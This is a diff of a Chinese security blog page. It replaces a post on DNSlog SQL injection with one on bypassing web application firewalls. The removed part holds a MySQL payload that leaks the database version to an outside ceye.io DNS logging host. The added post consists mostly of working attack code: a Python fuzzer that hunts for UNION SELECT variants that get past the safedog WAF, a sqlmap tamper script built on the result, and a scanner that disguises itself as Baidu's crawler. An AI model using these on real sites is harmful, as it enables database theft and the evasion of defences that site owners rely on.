@@ -16,23 +16,23 @@
   <meta name="author" content="liaoyue">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SQL注入——DNSlog注入0.前言&amp;emsp;&amp;emsp;在SQL注入选择布尔注入、时间盲注、注入的效率很低占用线程高还很容易被waf进行拦截，不仅如此，在目标重点没有明显回显的情况下，我们在读取文件、执行命令注入等操作时无法很好的确实是否利用成功，这时候就需要利用到DNSlog注入了。 &amp;emsp;&amp;emsp;前面也就介绍过所谓的DNS就是将域名解释为ip地址，当用户在浏览器输入一个域名A.">
+    <meta name="description" content="SQL注入——WAF绕过（二）0.前言&amp;emsp;&amp;emsp;对于WAF而言，需要形成一定的绕过体系与知识，才能很好的去针对这种情况的渗透，我们需要去自我一些脚本的知识来帮助我们进行攻击。 &amp;emsp; 1.Fuzz绕过脚本（来源：小迪安全） 1234567891011121314151617181920212223242526272829303132333435import requests,t">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入——DNSlog注入">
-<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/27/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94DNSlog%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="SQL注入——WAF绕过（二）">
+<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/29/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
 <meta property="og:site_name" content="one-null-poniter">
-<meta property="og:description" content="SQL注入——DNSlog注入0.前言&amp;emsp;&amp;emsp;在SQL注入选择布尔注入、时间盲注、注入的效率很低占用线程高还很容易被waf进行拦截，不仅如此，在目标重点没有明显回显的情况下，我们在读取文件、执行命令注入等操作时无法很好的确实是否利用成功，这时候就需要利用到DNSlog注入了。 &amp;emsp;&amp;emsp;前面也就介绍过所谓的DNS就是将域名解释为ip地址，当用户在浏览器输入一个域名A.">
+<meta property="og:description" content="SQL注入——WAF绕过（二）0.前言&amp;emsp;&amp;emsp;对于WAF而言，需要形成一定的绕过体系与知识，才能很好的去针对这种情况的渗透，我们需要去自我一些脚本的知识来帮助我们进行攻击。 &amp;emsp; 1.Fuzz绕过脚本（来源：小迪安全） 1234567891011121314151617181920212223242526272829303132333435import requests,t">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://one-null-pointer.github.io/img/web1.png">
-<meta property="article:published_time" content="2022-08-27T01:24:55.000Z">
-<meta property="article:modified_time" content="2022-08-28T10:42:58.802Z">
+<meta property="article:published_time" content="2022-08-29T10:57:56.000Z">
+<meta property="article:modified_time" content="2022-09-05T11:00:45.350Z">
 <meta property="article:author" content="liaoyue">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://one-null-pointer.github.io/img/web1.png">
   
   
   
-  <title>SQL注入——DNSlog注入 - one-null-poniter</title>
+  <title>SQL注入——WAF绕过（二） - one-null-poniter</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -185,7 +185,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SQL注入——DNSlog注入"></span>
+            <span id="subtitle" data-typed-text="SQL注入——WAF绕过（二）"></span>
           
         </div>
 
@@ -196,8 +196,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-27 09:24" pubdate>
-          August 27, 2022 am
+        <time datetime="2022-08-29 18:57" pubdate>
+          August 29, 2022 pm
         </time>
       </span>
     
@@ -208,7 +208,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          686 words
+          2.9k words
         
       </span>
     
@@ -219,7 +219,7 @@
         
         
         
-          6 mins
+          24 mins
         
       </span>
     
@@ -257,21 +257,32 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SQL注入——DNSlog注入</h1>
+            <h1 style="display: none">SQL注入——WAF绕过（二）</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SQL注入——DNSlog注入"><a href="#SQL注入——DNSlog注入" class="headerlink" title="SQL注入——DNSlog注入"></a>SQL注入——DNSlog注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;在SQL注入选择布尔注入、时间盲注、注入的效率很低占用线程高还很容易被waf进行拦截，不仅如此，在目标重点没有明显回显的情况下，我们在读取文件、执行命令注入等操作时无法很好的确实是否利用成功，这时候就需要利用到DNSlog注入了。</p>
-<p>&emsp;&emsp;前面也就介绍过所谓的DNS就是将域名解释为ip地址，当用户在浏览器输入一个域名A.com时，DNS就会将该域名解析到其所对应的ip地址127.0.0.1中。而DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名baidu.com等的访问信息，类似日志文件一样的东西。如遇到MySql的盲注时，可以利用内置函数load_file()来完成DNSlog。load_file()不仅能够加载本地文件，同时也能对诸如\<a target="_blank" rel="noopener" href="http://www.test.com/">www.test.com</a>这样的URL发起请求。</p>
-<p>&emsp;&emsp;注入语句示范：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> version()),<span class="hljs-string">&#x27;.oi2yec.ceye.io\\abc&#x27;</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)#; <br></code></pre></td></tr></table></figure>
+                <h1 id="SQL注入——WAF绕过（二）"><a href="#SQL注入——WAF绕过（二）" class="headerlink" title="SQL注入——WAF绕过（二）"></a>SQL注入——WAF绕过（二）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;对于WAF而言，需要形成一定的绕过体系与知识，才能很好的去针对这种情况的渗透，我们需要去自我一些脚本的知识来帮助我们进行攻击。</p>
+<p>&emsp;</p>
+<h4 id="1-Fuzz绕过脚本"><a href="#1-Fuzz绕过脚本" class="headerlink" title="1.Fuzz绕过脚本"></a>1.Fuzz绕过脚本</h4><p>（来源：小迪安全）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,time<br><br>url=<span class="hljs-string">&#x27;http://127.0.0.1:8080/sqli/Less-2/?id=-1&#x27;</span><br>union=<span class="hljs-string">&#x27;union&#x27;</span><br>select=<span class="hljs-string">&#x27;select&#x27;</span><br>num=<span class="hljs-string">&#x27;1,2,3&#x27;</span><br>a=&#123;<span class="hljs-string">&#x27;%0a&#x27;</span>,<span class="hljs-string">&#x27;%23&#x27;</span>&#125;<br>aa=&#123;<span class="hljs-string">&#x27;x&#x27;</span>&#125;<br>aaa=&#123;<span class="hljs-string">&#x27;%0a&#x27;</span>,<span class="hljs-string">&#x27;%23&#x27;</span>&#125;<br>b=<span class="hljs-string">&#x27;/*!&#x27;</span><br>c=<span class="hljs-string">&#x27;*/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bypass</span>():<br>	<span class="hljs-keyword">for</span> xiaodi <span class="hljs-keyword">in</span> a:<br>		<span class="hljs-keyword">for</span> xiaodis <span class="hljs-keyword">in</span> aa:<br>			<span class="hljs-keyword">for</span> xiaodiss <span class="hljs-keyword">in</span> aaa:<br>				<span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44500</span>,<span class="hljs-number">44600</span>):<br>					urls=url+xiaodi+xiaodis+xiaodiss+b+<span class="hljs-built_in">str</span>(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num<br>					<span class="hljs-comment">#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num</span><br>					<span class="hljs-keyword">try</span>:<br>						result=requests.get(urls).text<br>						len_r=<span class="hljs-built_in">len</span>(result)<br>						<span class="hljs-keyword">if</span> (result.find(<span class="hljs-string">&#x27;safedog&#x27;</span>)==-<span class="hljs-number">1</span>):<br>							<span class="hljs-comment">#print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r))</span><br>							 <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bypass url addreess：&#x27;</span>+urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(len_r))<br>						<span class="hljs-keyword">if</span> len_r==<span class="hljs-number">715</span>:<br>                             fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<br>                             fp.write(urls+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                             fp.close()<br>					<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>						<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connecting error&#x27;</span>)<br>						time.sleep(<span class="hljs-number">0.1</span>)<br><br>if__name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;fuzz strat!&#x27;</span>)<br>	bypass()<br></code></pre></td></tr></table></figure>
 
 <p>&emsp;</p>
-<p>&emsp;&emsp;（淦，pycharm的python2版本下不来DNSlog工具的库，解决了一天都没搞定，等有空吧环境放在虚拟机里面运行吧）</p>
-<h4 id="1-涉及相关链接网址："><a href="#1-涉及相关链接网址：" class="headerlink" title="1.涉及相关链接网址："></a>1.涉及相关链接网址：</h4><ul>
-<li><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></li>
+<h5 id="2-Payload脚本"><a href="#2-Payload脚本" class="headerlink" title="2.Payload脚本"></a>2.Payload脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)</span><br><span class="hljs-string">Seethefile&#x27;LICENSE&#x27;forcopyingpermission</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> lib.core.common <span class="hljs-keyword">import</span> singleTimeWarnMessage<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> DBMS<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.HIGHEST<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    singleTimeWarnMessage(<span class="hljs-string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>], DBMS.MYSQL))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-comment"># %23a%0aunion/*!44575select*/1,2,3</span><br>    <span class="hljs-keyword">if</span> payload:<br>        payload = payload.replace(<span class="hljs-string">&quot;union&quot;</span>, <span class="hljs-string">&quot;%23a%0aunion&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;/*!44575select*/&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;%20&quot;</span>, <span class="hljs-string">&quot;%23a%0a&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;%23a%0a&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;database()&quot;</span>, <span class="hljs-string">&quot;database%23a%0a()&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
+
+<p>&emsp;</p>
+<h4 id="3-伪装百度的爬虫脚本"><a href="#3-伪装百度的爬虫脚本" class="headerlink" title="3.伪装百度的爬虫脚本"></a>3.伪装百度的爬虫脚本</h4><p>（搜索引擎爬虫 http 指纹头）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://192.168.0.103:8080/&#x27;</span><br><br>head=&#123;<br>	<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span><br>&#125;<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;PH1P.txt&#x27;</span>):<br>    data=data.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    urls=url+data<br>    code=requests.get(urls.headers=head).status_code<br>    <span class="hljs-built_in">print</span>(urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(code))<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%EF%BC%88%E4%BA%8C%EF%BC%89/3.jpg" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="4-中转注入"><a href="#4-中转注入" class="headerlink" title="4.中转注入"></a>4.中转注入</h4><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;sqlmap注入本地的脚本地址——&gt;本地搭建脚本（请求书包自定义编写）——&gt;远程地址</p>
+<p>&emsp;&emsp;当受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p>
+<p>参考资源</p>
+<h5 id="》涉及相关链接网址："><a href="#》涉及相关链接网址：" class="headerlink" title="=》涉及相关链接网址："></a>=》涉及相关链接网址：</h5><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/keta/p/9469417.html">https://www.cnblogs.com/keta/p/9469417.html</a></li>
 </ul>
 
                 
@@ -311,8 +322,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SQL注入——DNSlog注入</div>
-      <div>https://one-null-pointer.github.io/2022/08/27/SQL注入——DNSlog注入/</div>
+      <div>SQL注入——WAF绕过（二）</div>
+      <div>https://one-null-pointer.github.io/2022/08/29/SQL注入——WAF绕过（二）/</div>
     </div>
     <div class="license-meta">
       
@@ -324,7 +335,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 27, 2022</div>
+          <div>August 29, 2022</div>
         </div>
       
       
@@ -354,18 +365,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/28/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/" title="SQL注入——WAF绕过（一）">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SQL注入——WAF绕过（一）</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" title="SQL注入——二次注入">
-                        <span class="hidden-mobile">SQL注入——二次注入</span>
+                      <a href="/2022/08/28/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/" title="SQL注入——WAF绕过（一）">
+                        <span class="hidden-mobile">SQL注入——WAF绕过（一）</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
